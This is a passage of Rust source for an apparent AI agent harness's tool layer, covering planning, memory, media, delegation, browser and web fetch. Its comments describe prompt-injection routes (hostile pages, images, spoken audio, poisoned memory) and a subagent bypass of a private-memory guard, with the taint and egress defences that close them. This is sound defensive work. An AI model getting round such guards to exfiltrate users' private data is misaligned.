    // case, NO exponential backtracking (the old recursive `*` could hang a core on a crafted
    // pattern, and tool calls have no timeout). `*`/`?` never cross '/' (segments split by `rec`).
    fn seg_match(p: &[u8], t: &[u8]) -> bool {
        let (mut pi, mut ti) = (0usize, 0usize);
        let (mut star, mut mark) = (None, 0usize);
        while ti < t.len() {
            if pi < p.len() && (p[pi] == t[ti] || (p[pi] == b'?' && t[ti] != b'/')) {
                pi += 1;
                ti += 1;
            } else if pi < p.len() && p[pi] == b'*' {
                star = Some(pi);
                mark = ti;
                pi += 1;
            } else if let Some(sp) = star {
                // Backtrack: let the last `*` consume one more char (never crossing '/').
                if t[mark] == b'/' {
                    return false;
                }
                pi = sp + 1;
                mark += 1;
                ti = mark;
            } else {
                return false;
            }
        }
        while pi < p.len() && p[pi] == b'*' {
            pi += 1;
        }
        pi == p.len()
    }
    // Handle `**` by matching the rest of the pattern against any suffix of the path segments.
    fn rec(pp: &[&str], tt: &[&str]) -> bool {
        match pp.first() {
            None => tt.is_empty(),
            Some(&"**") => {
                // `**` matches zero or more path segments.
                (0..=tt.len()).any(|i| rec(&pp[1..], &tt[i..]))
            }
            Some(seg) => {
                !tt.is_empty()
                    && seg_match(seg.as_bytes(), tt[0].as_bytes())
                    && rec(&pp[1..], &tt[1..])
            }
        }
    }
    let pp: Vec<&str> = pattern.split('/').filter(|s| !s.is_empty()).collect();
    let tt: Vec<&str> = path.split('/').filter(|s| !s.is_empty()).collect();
    rec(&pp, &tt)
}

// ---------------------------------------------------------------------------
// Planning
// ---------------------------------------------------------------------------

/// An explicit, ledgered to-do list the agent maintains across a multi-step task -
/// frontier-harness planning, surfaced in the glass-box receipt so the user sees intent.
pub struct UpdatePlanTool;

#[async_trait]
impl Tool for UpdatePlanTool {
    fn name(&self) -> &str {
        "update_plan"
    }
    fn description(&self) -> &str {
        "Record or update your step-by-step plan for a multi-step task. Call it early to outline \
         the steps, then again to mark progress - it echoes the full checklist back so it stays in \
         context through long runs, and shows the user your plan. Each step has a 'title' and a \
         'status' (todo, doing, done)."
    }
    fn schema(&self) -> Value {
        json!({
            "type": "object",
            "properties": {
                "steps": {
                    "type": "array",
                    "items": {
                        "type": "object",
                        "properties": {
                            "title": { "type": "string" },
                            "status": { "type": "string", "enum": ["todo", "doing", "done"] }
                        },
                        "required": ["title"]
                    }
                }
            },
            "required": ["steps"]
        })
    }
    async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
        let steps = args["steps"].as_array().ok_or("steps must be an array")?;
        let total = steps.len();
        let done = steps.iter().filter(|s| s["status"] == "done").count();
        let _ = ctx.ledger.append(
            "agent.plan",
            "agent",
            json!({ "steps": steps, "total": total, "done": done }),
        );
        // Render the FULL checklist as the observation (not just a count): on every update the plan
        // is re-stated into the live context, so it survives transcript compaction on long tasks.
        let mut out = format!("plan ({done}/{total} done):");
        for s in steps {
            let title = s["title"].as_str().unwrap_or("").trim();
            let mark = match s["status"].as_str().unwrap_or("todo") {
                "done" => 'x',
                "doing" => '~',
                _ => ' ',
            };
            out.push_str(&format!("\n  [{mark}] {title}"));
        }
        Ok(out)
    }
}

// ---------------------------------------------------------------------------
// Memory
// ---------------------------------------------------------------------------

pub struct MemoryRecallTool;

#[async_trait]
impl Tool for MemoryRecallTool {
    fn name(&self) -> &str {
        "memory_recall"
    }
    fn description(&self) -> &str {
        "Search the agent's long-term memory (semantic + keyword) for relevant facts."
    }
    fn schema(&self) -> Value {
        json!({ "type": "object",
            "properties": { "query": { "type": "string" }, "k": { "type": "integer" } },
            "required": ["query"] })
    }
    // Recall surfaces the user's private knowledge into the run, so it marks the run sensitive:
    // combined with reading untrusted content, that arms the no-egress exfiltration guard.
    fn reads_sensitive(&self) -> bool {
        true
    }
    async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
        // An untrusted-origin run (inbound channel/Telegram/webhook) returns its answer verbatim to an
        // anonymous requester — a reply channel the trifecta egress gate does NOT cover — and recall
        // serves the private user-global ring. Refuse here, at the tool, so the guarantee holds no
        // matter how the toolset was assembled: the daemon strips this tool from untrusted top-level
        // runs, but a DELEGATED subagent rebuilds its toolset from sub_tools() and would otherwise
        // still expose it. (This is the single chokepoint that closes that bypass.)
        if ctx.taint.is_untrusted() {
            return Err(
                "memory_recall is unavailable on a run that has read untrusted content (private-memory guard)"
                    .into(),
            );
        }
        let query = arg_str(args, "query")?;
        let k = args["k"].as_u64().unwrap_or(5) as usize;
        // Trusted-provenance memories only (injected web/memory content can't poison it), ringed to the
        // run's scope so a deliberate recall in a project chat surfaces only this project ∪ user-global.
        let hits = ctx
            .memory
            .recall_trusted_scoped(query, &[], k, &ctx.scope)
            .map_err(|e| e.to_string())?;
        if hits.is_empty() {
            return Ok("(no relevant memories)".into());
        }
        Ok(hits
            .iter()
            .map(|h| format!("- [{}] {}", h.record.region, h.record.text))
            .collect::<Vec<_>>()
            .join("\n"))
    }
}

pub struct MemoryRememberTool;

#[async_trait]
impl Tool for MemoryRememberTool {
    fn name(&self) -> &str {
        "memory_remember"
    }
    fn description(&self) -> &str {
        "Store a fact in long-term memory (region: semantic, identity, episodic, or procedural)."
    }
    fn schema(&self) -> Value {
        json!({ "type": "object",
            "properties": { "text": { "type": "string" }, "region": { "type": "string" } },
            "required": ["text"] })
    }
    async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
        // Same guarantee as memory_recall: an untrusted-origin run must not touch the memory store,
        // enforced at the tool so a delegated subagent (which rebuilds its toolset) can't reach it.
        if ctx.taint.is_untrusted() {
            return Err(
                "memory_remember is unavailable on a run that has read untrusted content (private-memory guard)"
                    .into(),
            );
        }
        let text = arg_str(args, "text")?;
        let region = match args["region"].as_str() {
            Some("identity") => Region::Identity,
            Some("episodic") => Region::Episodic,
            Some("procedural") => Region::Procedural,
            _ => Region::Semantic,
        };
        // Writes inherit the run's taint, so injected content can't launder into a trusted fact,
        // and land in the run's durable ring (this project, else user-global) - so a memory the
        // agent stores in a project chat stays in that project. Identity is always user-global.
        let write_scope = if region == Region::Identity {
            engram_memory::Scope::user()
        } else {
            ctx.scope.durable_write_scope()
        };
        let rec = ctx
            .memory
            .remember(
                WriteReq::new(region, text)
                    .taint(ctx.taint)
                    .actor("agent")
                    .scope(write_scope),
            )
            .map_err(|e| e.to_string())?;
        Ok(format!("remembered as #{}", rec.id))
    }
}

// ---------------------------------------------------------------------------
// Media (vision, image generation, speech) - through the gateway
// ---------------------------------------------------------------------------

pub struct VisionAnalyzeTool;

#[async_trait]
impl Tool for VisionAnalyzeTool {
    fn name(&self) -> &str {
        "vision_analyze"
    }
    fn description(&self) -> &str {
        "Look at an image file in the workdir (e.g. a screenshot) and answer a question about it."
    }
    fn schema(&self) -> Value {
        json!({ "type": "object",
            "properties": { "path": { "type": "string" }, "question": { "type": "string" } },
            "required": ["path", "question"] })
    }
    // The image is attacker-influenceable content interpreted into the model (a screenshot of a
    // hostile page, a downloaded picture), so looking at it taints the run; the local file may
    // also be private, so it sensitises too - both arms of the trifecta gate.
    fn taints(&self) -> bool {
        true
    }
    fn reads_sensitive(&self) -> bool {
        true
    }
    async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
        let path = confine(&ctx.workdir, arg_str_any(args, PATH_KEYS)?)?;
        let question = arg_str(args, "question")?;
        let bytes = tokio::fs::read(&path).await.map_err(|e| e.to_string())?;
        let b64 = base64::engine::general_purpose::STANDARD.encode(&bytes);
        let model = ctx
            .policy
            .vision_model
            .clone()
            .or_else(|| std::env::var("ENGRAM_VISION_MODEL").ok())
            .unwrap_or_else(|| ctx.model.clone());
        let req = CompletionRequest::new(model, vec![Message::user_with_image(question, b64)]);
        let completion = ctx
            .gateway
            .complete(Call::new(req).actor("agent").tainted(ctx.taint))
            .await
            .map_err(|e| e.to_string())?;
        Ok(completion.text)
    }
}

pub struct ImageGenerateTool;

#[async_trait]
impl Tool for ImageGenerateTool {
    fn name(&self) -> &str {
        "image_generate"
    }
    fn side_effecting(&self) -> bool {
        true
    }
    fn description(&self) -> &str {
        "Generate an image from a text prompt and save it as a PNG in the workdir."
    }
    fn schema(&self) -> Value {
        json!({ "type": "object",
            "properties": { "prompt": { "type": "string" }, "path": { "type": "string" } },
            "required": ["prompt", "path"] })
    }
    async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
        let prompt = arg_str(args, "prompt")?;
        let path = confine(&ctx.workdir, arg_str_any(args, PATH_KEYS)?)?;
        let bytes = ctx
            .gateway
            .generate_image(prompt, "agent")
            .await
            .map_err(|e| e.to_string())?;
        tokio::fs::write(&path, &bytes)
            .await
            .map_err(|e| e.to_string())?;
        Ok(format!(
            "saved {}-byte image to {}",
            bytes.len(),
            path.display()
        ))
    }
}

pub struct TextToSpeechTool;

#[async_trait]
impl Tool for TextToSpeechTool {
    fn name(&self) -> &str {
        "text_to_speech"
    }
    fn side_effecting(&self) -> bool {
        true
    }
    fn description(&self) -> &str {
        "Synthesize speech from text and save the audio file in the workdir."
    }
    fn schema(&self) -> Value {
        json!({ "type": "object",
            "properties": { "text": { "type": "string" }, "path": { "type": "string" }, "voice": { "type": "string" } },
            "required": ["text", "path"] })
    }
    async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
        let text = arg_str(args, "text")?;
        let path = confine(&ctx.workdir, arg_str_any(args, PATH_KEYS)?)?;
        let voice = args["voice"].as_str().unwrap_or("alloy");
        let bytes = ctx
            .gateway
            .tts(text, voice, "agent")
            .await
            .map_err(|e| e.to_string())?;
        tokio::fs::write(&path, &bytes)
            .await
            .map_err(|e| e.to_string())?;
        Ok(format!(
            "saved {}-byte audio to {}",
            bytes.len(),
            path.display()
        ))
    }
}

pub struct TranscribeTool;

#[async_trait]
impl Tool for TranscribeTool {
    fn name(&self) -> &str {
        "transcribe"
    }
    fn description(&self) -> &str {
        "Transcribe an audio file in the workdir to text (speech-to-text)."
    }
    fn schema(&self) -> Value {
        json!({ "type": "object",
            "properties": { "path": { "type": "string" }, "format": { "type": "string" } },
            "required": ["path"] })
    }
    // Transcribed audio is untrusted, model-interpreted content (an attacker can speak an
    // injection); the source file may be private too.
    fn taints(&self) -> bool {
        true
    }
    fn reads_sensitive(&self) -> bool {
        true
    }
    async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
        let path = confine(&ctx.workdir, arg_str_any(args, PATH_KEYS)?)?;
        let format = args["format"]
            .as_str()
            .map(String::from)
            .or_else(|| path.extension().and_then(|e| e.to_str()).map(String::from))
            .unwrap_or_else(|| "mp3".into());
        let bytes = tokio::fs::read(&path).await.map_err(|e| e.to_string())?;
        ctx.gateway
            .transcribe(&bytes, &format, "agent")
            .await
            .map_err(|e| e.to_string())
    }
}

// ---------------------------------------------------------------------------
// Delegation (subagents)
// ---------------------------------------------------------------------------

pub struct DelegateTool;

#[async_trait]
impl Tool for DelegateTool {
    fn name(&self) -> &str {
        "delegate_task"
    }
    fn description(&self) -> &str {
        "Delegate a focused subtask to an isolated subagent and return its result. Use \
         for parallelizable or self-contained work that deserves its own reasoning."
    }
    fn schema(&self) -> Value {
        json!({ "type": "object", "properties": { "task": { "type": "string" } }, "required": ["task"] })
    }
    async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
        if ctx.depth >= 2 {
            return Err("maximum delegation depth (2) reached".into());
        }
        let task = arg_str(args, "task")?;
        let _ = ctx.ledger.append(
            "agent.delegate",
            "agent",
            json!({ "task": task, "depth": ctx.depth }),
        );
        // The subagent gets the base toolset (no further delegation by default) and a deeper context,
        // but inherits the parent's guarantees:
        //  - taint/sensitive (an untrusted parent yields an untrusted child) via the cloned ctx;
        //  - the kill switch, shared token budget, and step/narration callbacks — carried on the ctx
        //    (seeded from the parent Agent at its run entry), so a delegated run can be cancelled,
        //    counts against the SAME budget, and is visible in the UI like the parent;
        //  - the parent's TOOL SCOPE: the sub-toolset is intersected with `allowed_tools` so a
        //    delegated worker can never exceed the tool permissions the parent was restricted to.
        let mut sub_tools = crate::sub_tools();
        if let Some(allowed) = &ctx.allowed_tools {
            let allowed = allowed.clone();
            sub_tools = sub_tools.retaining(move |name| allowed.iter().any(|a| a == name));
        }
        let agent = crate::agent::Agent::new(ctx.gateway.clone(), sub_tools, ctx.model.clone());
        let mut sub = ctx.clone();
        sub.depth = ctx.depth + 1;
        let run = agent.run(task, sub).await.map_err(|e| e.to_string())?;
        Ok(run.answer)
    }
}

// ---------------------------------------------------------------------------
// Browser (headless Chrome via subprocess - real JS rendering, no extra deps)
// ---------------------------------------------------------------------------

pub(crate) fn find_chrome() -> Option<String> {
    if let Ok(p) = std::env::var("ENGRAM_CHROME") {
        if std::path::Path::new(&p).exists() {
            return Some(p);
        }
    }
    const CANDIDATES: &[&str] = &[
        "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
        "/Applications/Chromium.app/Contents/MacOS/Chromium",
        "/Applications/Brave Browser.app/Contents/MacOS/Brave Browser",
        "/usr/bin/google-chrome",
        "/usr/bin/chromium",
        "/usr/bin/chromium-browser",
    ];
    CANDIDATES
        .iter()
        .find(|p| std::path::Path::new(p).exists())
        .map(|s| s.to_string())
}

const CHROME_FLAGS: &[&str] = &[
    "--headless=new",
    "--disable-gpu",
    "--no-sandbox",
    "--no-first-run",
    "--no-default-browser-check",
    "--disable-extensions",
];

/// A FRESH, unique Chrome profile dir for a single one-shot launch. Without `--user-data-dir`
/// Chrome uses the default profile (locked when the user has Chrome open). A per-PROCESS dir wasn't
/// enough: two one-shot launches in the same daemon (e.g. a screenshot the model retries) then
/// share one dir and the second can't lock it → it hangs → "browser timed out". A per-CALL dir
/// makes every launch independent; the returned guard removes it when the call ends.
fn fresh_chrome_profile() -> ChromeProfile {
    static N: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
    let n = N.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    let d = std::env::temp_dir().join(format!("engram-chrome-{}-{}", std::process::id(), n));
    let _ = std::fs::create_dir_all(&d);
    ChromeProfile(d)
}
struct ChromeProfile(std::path::PathBuf);
impl Drop for ChromeProfile {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.0);
    }
}
/// Headless Chrome on macOS legitimately needs several seconds to cold-start when spawned by a
/// background app; give a one-shot render real headroom so a first launch isn't cut short.
fn browse_timeout(requested: u64) -> u64 {
    requested.max(60)
}

/// Build a Chrome `--host-resolver-rules` flag that PINS the URL's host to the single vetted IP
/// (and fails every other resolution), so Chrome's own resolver/redirects can't be DNS-rebound or
/// 302'd to a private/metadata address. Validates the URL through the SSRF guard along the way.
async fn resolver_rule(url: &str) -> Result<String, String> {
    let t = resolve_guarded(url).await?;
    let ip = t.addrs.first().ok_or("no vetted address")?.ip();
    Ok(format!(
        "--host-resolver-rules=MAP {} {ip},MAP * ^NOTFOUND",
        t.host
    ))
}

/// The `--host-resolver-rules` pin defeats DNS-rebinding for PUBLIC hosts (resolve once, pin the
/// IP so Chrome can't be redirected to a private address mid-load). A `file://` has no host and a
/// loopback preview is intentional, so those skip the pin (and `resolve_guarded`, which rejects
/// non-public IPs). Returns None when no pin is needed.
async fn browse_pin(url: &str) -> Result<Option<String>, String> {
    let u = url.trim();
    if u.starts_with("file://") {
        return Ok(None);
    }
    let host_local = classify_browse(u, std::path::Path::new("/"))
        .map(|t| matches!(t, LocalTarget::Loopback))
        .unwrap_or(false);
    if host_local {
        return Ok(None);
    }
    Ok(Some(resolver_rule(url).await?))
}

async fn chrome_dump_dom(url: &str, timeout: u64) -> Result<String, String> {
    let chrome = find_chrome().ok_or("no Chrome/Chromium found (set ENGRAM_CHROME)")?;
    let pin = browse_pin(url).await?;
    let profile = fresh_chrome_profile();
    let fut = tokio::process::Command::new(&chrome)
        .args(CHROME_FLAGS)
        .arg(format!("--user-data-dir={}", profile.0.display()))
        .args(pin.as_deref())
        .arg("--dump-dom")
        .arg(url)
        // Kill the headless Chrome if the timeout drops this future, so a hung render doesn't leak
        // a Chrome process for the rest of the daemon's life.
        .kill_on_drop(true)
        .output();
    let out = tokio::time::timeout(Duration::from_secs(browse_timeout(timeout)), fut)
        .await
        .map_err(|_| "browser timed out".to_string())?
        .map_err(|e| e.to_string())?;
    if out.stdout.is_empty() {
        return Err(format!(
            "browser produced no output: {}",
            String::from_utf8_lossy(&out.stderr)
                .chars()
                .take(200)
                .collect::<String>()
        ));
    }
    Ok(String::from_utf8_lossy(&out.stdout).to_string())
}

async fn chrome_screenshot(
    url: &str,
    out_path: &std::path::Path,
    timeout: u64,
) -> Result<(), String> {
    let chrome = find_chrome().ok_or("no Chrome/Chromium found (set ENGRAM_CHROME)")?;
    let pin = browse_pin(url).await?;
    let profile = fresh_chrome_profile();
    // Remove any stale file so we can detect THIS capture appearing.
    let _ = std::fs::remove_file(out_path);
    let mut child = tokio::process::Command::new(&chrome)
        .args(CHROME_FLAGS)
        .arg(format!("--user-data-dir={}", profile.0.display()))
        .args(pin.as_deref())
        .arg("--hide-scrollbars")
        .arg("--window-size=1280,1024")
        .arg(format!("--screenshot={}", out_path.display()))
        .arg(url)
        .kill_on_drop(true)
        .spawn()
        .map_err(|e| format!("could not launch browser: {e}"))?;
    // `--headless=new` WRITES the PNG then keeps running (it doesn't self-exit after --screenshot),
    // so waiting for process exit would time out on a SUCCESS. Poll for the file, and once it is
    // present and its size has settled, kill Chrome and return — this is what makes screenshots
    // reliable. Only a real absence after the whole budget is a failure.
    let deadline = std::time::Instant::now() + Duration::from_secs(browse_timeout(timeout));
    let mut last_len: u64 = 0;
    loop {
        if let Ok(m) = std::fs::metadata(out_path) {
            let len = m.len();
            if len > 0 && len == last_len {
                let _ = child.kill().await;
                return Ok(());
            }
            last_len = len;
        }
        // Chrome exited on its own (crash or old-headless) — check the result once and stop.
        if let Ok(Some(status)) = child.try_wait() {
            if std::fs::metadata(out_path)
                .map(|m| m.len() > 0)
                .unwrap_or(false)
            {
                return Ok(());
            }
            return Err(format!(
                "browser exited without a screenshot (status {status})"
            ));
        }
        if std::time::Instant::now() >= deadline {
            let _ = child.kill().await;
            return Err(if out_path.exists() {
                "browser timed out finishing the screenshot".into()
            } else {
                "browser timed out before producing a screenshot (is the page reachable?)".into()
            });
        }
        tokio::time::sleep(Duration::from_millis(250)).await;
    }
}

pub struct BrowserReadTool;

#[async_trait]
impl Tool for BrowserReadTool {
    fn name(&self) -> &str {
        "browser_read"
    }
    fn description(&self) -> &str {
        "Open a URL in a headless browser (running its JavaScript) and return the rendered \
         page text. Use for JS-heavy pages and SPAs where web_fetch returns little."
    }
    fn schema(&self) -> Value {
        json!({ "type": "object", "properties": { "url": { "type": "string" } }, "required": ["url"] })
    }
    fn taints(&self) -> bool {
        true
    }
    fn is_egress(&self) -> bool {
        false
    }
    async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
        let url = arg_str(args, "url")?;
        // Permit previewing a workdir file or a loopback dev server (clean runs); public URLs are
        // vetted + exfil-guarded exactly as before.
        let trifecta = ctx.taint.is_untrusted() && ctx.sensitive && !ctx.policy.approved;
        let target = guard_browse_url(url, &ctx.workdir, trifecta).await?;
        let _ = ctx.ledger.append(
            "agent.browser_read",
            "agent",
            json!({ "url": url, "dest": crate::agent::host_of(url) }),
        );
        let html =
            chrome_dump_dom(&browse_url(url, &target), ctx.policy.timeout_secs.max(30)).await?;
        Ok(html_to_text(&html))
    }
}

pub struct BrowserScreenshotTool;

#[async_trait]
impl Tool for BrowserScreenshotTool {
    fn name(&self) -> &str {
        "browser_screenshot"
    }
    fn description(&self) -> &str {
        "Screenshot a page to a PNG in the workdir. Pass an optional `url` to navigate there first \
         (and an optional `question` to have the agent SEE and describe the shot). To preview \
         something you just built, pass a file:// URL to an HTML file in the working directory \
         (e.g. file:///.../index.html) or a http://localhost:PORT dev-server URL - both work."
    }
    fn schema(&self) -> Value {
        json!({ "type": "object",
            "properties": {
                "url": { "type": "string", "description": "navigate here first (optional)" },
                "path": { "type": "string", "description": "save path (default screenshot.png)" },
                "question": { "type": "string", "description": "if set, look at the shot and answer this" }
            } })
    }
    fn taints(&self) -> bool {
        true
    }
    fn is_egress(&self) -> bool {
        false
    }
    async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
        let rel = args["path"].as_str().unwrap_or("screenshot.png");
        let path = confine(&ctx.workdir, rel)?;
        // Navigate the LIVE session first when a url is given, so the shot reflects the real,
        // authenticated, multi-step page (not a throwaway cookieless Chrome).
        if let Some(url) = args["url"].as_str() {
            let trifecta = ctx.taint.is_untrusted() && ctx.sensitive && !ctx.policy.approved;
            let target = guard_browse_url(url, &ctx.workdir, trifecta).await?;
            // A workdir file or loopback preview goes straight to the one-shot standalone capture
            // (the interactive CDP session's Fetch interception + post-nav public-origin guard are
            // built for untrusted web browsing, not a local file/dev-server preview).
            if !matches!(target, LocalTarget::Public) {
                chrome_screenshot(
                    &browse_url(url, &target),
                    &path,
                    ctx.policy.timeout_secs.max(30),
                )
                .await?;
                let _ =
                    ctx.ledger
                        .append("agent.browser_screenshot", "agent", json!({ "path": rel }));
                return screenshot_answer(args, &path, ctx).await;
            }
            ctx.browser.open(url).await?;
        }
        let _ = ctx
            .ledger
            .append("agent.browser_screenshot", "agent", json!({ "path": rel }));
        // Capture from the live CDP session. If interactive browsing isn't built in but a url was
        // given, fall back to the standalone headless capture so the tool still works.
        if let Err(e) = ctx.browser.screenshot(&path).await {
            match args["url"].as_str() {
                Some(url) => chrome_screenshot(url, &path, ctx.policy.timeout_secs.max(30)).await?,
                None => return Err(e),
            }
        }
        screenshot_answer(args, &path, ctx).await
    }
}

/// After a screenshot is on disk: if a `question` was asked, route the PNG through the multimodal
/// gateway so the agent actually SEES the page; otherwise just report the saved path. Shared by the
/// local-preview and interactive-session capture paths.
async fn screenshot_answer(
    args: &Value,
    path: &std::path::Path,
    ctx: &ToolCtx,
) -> Result<String, String> {
    if let Some(question) = args["question"].as_str().filter(|q| !q.is_empty()) {
        let bytes = tokio::fs::read(path).await.map_err(|e| e.to_string())?;
        let b64 = base64::engine::general_purpose::STANDARD.encode(&bytes);
        let model = ctx
            .policy
            .vision_model
            .clone()
            .or_else(|| std::env::var("ENGRAM_VISION_MODEL").ok())
            .unwrap_or_else(|| ctx.model.clone());
        let req = CompletionRequest::new(model, vec![Message::user_with_image(question, b64)]);
        let c = ctx
            .gateway
            .complete(Call::new(req).actor("agent").tainted(ctx.taint))
            .await
            .map_err(|e| e.to_string())?;
        return Ok(format!("[saved {}] {}", path.display(), c.text));
    }
    Ok(format!(
        "saved screenshot to {} (use vision_analyze or pass a question to read it)",
        path.display()
    ))
}

pub struct BrowserWaitTool;

#[async_trait]
impl Tool for BrowserWaitTool {
    fn name(&self) -> &str {
        "browser_wait"
    }
    fn description(&self) -> &str {
        "Wait until a CSS selector appears in the live browser page (for content that renders \
         after navigation or an interaction). Returns once present or times out."
    }
    fn schema(&self) -> Value {
        json!({ "type": "object",
            "properties": {
                "selector": { "type": "string" },
                "timeout_ms": { "type": "integer", "description": "default 8000" }
            },
            "required": ["selector"] })
    }
    fn side_effecting(&self) -> bool {
        true
    }
    async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
        let selector = arg_str(args, "selector")?;
        let timeout = args["timeout_ms"].as_u64().unwrap_or(8000);
        ctx.browser.wait_for(selector, timeout).await
    }
}

pub struct BrowserScrollTool;

#[async_trait]
impl Tool for BrowserScrollTool {
    fn name(&self) -> &str {
        "browser_scroll"
    }
    fn description(&self) -> &str {
        "Scroll the live browser page by a number of pixels (negative scrolls up) to reveal \
         lazy-loaded or below-the-fold content."
    }
    fn schema(&self) -> Value {
        json!({ "type": "object", "properties": { "dy": { "type": "integer" } }, "required": ["dy"] })
    }
    fn side_effecting(&self) -> bool {
        true
    }
    async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
        let dy = args["dy"].as_i64().unwrap_or(600);
        ctx.browser.scroll(dy).await
    }
}

// Interactive browser tools - drive a persistent session via ctx.browser.

pub struct BrowserOpenTool;

#[async_trait]
impl Tool for BrowserOpenTool {
    fn name(&self) -> &str {
        "browser_open"
    }
    fn description(&self) -> &str {
        "Navigate the interactive browser to a URL and return the page text. Follow with \
         browser_click / browser_type / browser_extract for multi-step tasks. Also opens a \
         file:// path inside the working directory or a http://localhost dev server to preview \
         something you just built."
    }
    fn schema(&self) -> Value {
        json!({ "type": "object", "properties": { "url": { "type": "string" } }, "required": ["url"] })
    }
    fn taints(&self) -> bool {
        true
    }
    fn is_egress(&self) -> bool {
        false
    }
    async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
        let url = arg_str(args, "url")?;
        let trifecta = ctx.taint.is_untrusted() && ctx.sensitive && !ctx.policy.approved;
        let target = guard_browse_url(url, &ctx.workdir, trifecta).await?;
        let _ = ctx.ledger.append(
            "agent.browser_open",
            "agent",
            json!({ "url": url, "dest": crate::agent::host_of(url) }),
        );
        // A workdir file / loopback preview: one-shot render (the interactive CDP session's Fetch
        // interception + post-nav public-origin guard are for untrusted web browsing, not previews).
        if !matches!(target, LocalTarget::Public) {
            let html =
                chrome_dump_dom(&browse_url(url, &target), ctx.policy.timeout_secs.max(30)).await?;
            return Ok(html_to_text(&html));
        }
        ctx.browser.open(url).await
    }
}

pub struct BrowserClickTool;

#[async_trait]
impl Tool for BrowserClickTool {
    fn name(&self) -> &str {
        "browser_click"
    }
    fn side_effecting(&self) -> bool {
        true
    }
    fn description(&self) -> &str {
        "Click the first element matching a CSS selector in the current browser page."
    }
    fn schema(&self) -> Value {
        json!({ "type": "object", "properties": { "selector": { "type": "string" } }, "required": ["selector"] })
    }
    fn taints(&self) -> bool {
        true
    }
    fn is_egress(&self) -> bool {
        false
    }
    async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
        let _ = ctx.ledger.append("agent.browser_click", "agent", json!({}));
        ctx.browser.click(arg_str(args, "selector")?).await
    }
}

pub struct BrowserTypeTool;

#[async_trait]
impl Tool for BrowserTypeTool {
    fn name(&self) -> &str {
        "browser_type"
    }
    fn side_effecting(&self) -> bool {
        true
    }
    fn description(&self) -> &str {
        "Type text into the first element matching a CSS selector in the current page."
    }
    fn schema(&self) -> Value {
        json!({ "type": "object",
            "properties": { "selector": { "type": "string" }, "text": { "type": "string" } },
            "required": ["selector", "text"] })
    }
    fn taints(&self) -> bool {
        true
    }
    fn is_egress(&self) -> bool {
        false
    }
    async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
        let _ = ctx.ledger.append("agent.browser_type", "agent", json!({}));
        ctx.browser
            .type_text(arg_str(args, "selector")?, arg_str(args, "text")?)
            .await
    }
}

pub struct BrowserExtractTool;

#[async_trait]
impl Tool for BrowserExtractTool {
    fn name(&self) -> &str {
        "browser_extract"
    }
    fn description(&self) -> &str {
        "Extract text from the current browser page, optionally limited to a CSS selector."
    }
    fn schema(&self) -> Value {
        json!({ "type": "object", "properties": { "selector": { "type": "string" } } })
    }
    fn taints(&self) -> bool {
        true
    }
    fn is_egress(&self) -> bool {
        false
    }
    async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
        ctx.browser.extract(args["selector"].as_str()).await
    }
}

#[cfg(test)]
mod browser_tests {
    use super::*;

    #[tokio::test]
    #[ignore = "needs Chrome"]
    async fn reads_a_real_page_with_js() {
        let html = chrome_dump_dom("https://example.com", 30).await.unwrap();
        assert!(html_to_text(&html).contains("Example Domain"));
    }

    #[tokio::test]
    #[ignore = "needs Chrome"]
    async fn screenshots_a_page() {
        let dir = tempfile::tempdir().unwrap();
        let out = dir.path().join("shot.png");
        chrome_screenshot("https://example.com", &out, 30)
            .await
            .unwrap();
        assert!(out.exists() && std::fs::metadata(&out).unwrap().len() > 0);
    }
}

// ---------------------------------------------------------------------------
// Web (feature-gated)
// ---------------------------------------------------------------------------

#[cfg(feature = "web")]
pub use web::{SendMessageTool, WebFetchTool, WebSearchTool};

#[cfg(feature = "web")]
mod web {
    use super::*;

    /// Fetch text with SSRF protection that survives redirects and DNS-rebinding: every hop is
    /// re-validated by [`resolve_guarded`] and the connection is **pinned** to the vetted IP via
    /// `resolve_to_addrs`, so a public host can't 302 to (or rebind to) a private/metadata IP.
    async fn get_text(url: &str, timeout: u64) -> Result<String, String> {
        let mut current = url.to_string();
        for _hop in 0..6 {
            let target = super::resolve_guarded(&current).await?;
            let client = reqwest::Client::builder()
                // A real browser UA: search engines and many sites drop/deny a bot UA like
                // "engram-agent/0.1", which made web_search/web_fetch silently fail.
                .user_agent("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
                .timeout(Duration::from_secs(timeout))
                // Follow redirects manually so each hop is SSRF-checked before we connect.
                .redirect(reqwest::redirect::Policy::none())
                // Pin the hostname to the exact IPs we just validated (no re-resolution).
                .resolve_to_addrs(&target.host, &target.addrs)
                .build()
                .map_err(|e| e.to_string())?;
            let resp = client
                .get(&current)
                .send()
                .await
                .map_err(|e| e.to_string())?;
            if resp.status().is_redirection() {
                if let Some(loc) = resp
                    .headers()
                    .get(reqwest::header::LOCATION)
                    .and_then(|v| v.to_str().ok())
                {
                    current = super::absolutize(&current, loc);
                    continue;
                }
            }
            return resp.text().await.map_err(|e| e.to_string());
        }
        Err("too many redirects".into())
    }

    /// Query the Brave Search API (clean JSON, no bot-detection) when `BRAVE_API_KEY` is set — the
    /// reliable alternative to scraping search-engine HTML, which gets rate-limited/blocked. Free key
    /// at https://api.search.brave.com. Returns formatted result lines, or Err to fall back to scrape.
    async fn brave_api_search(query: &str, key: &str, timeout: u64) -> Result<Vec<String>, String> {
        let url = format!(
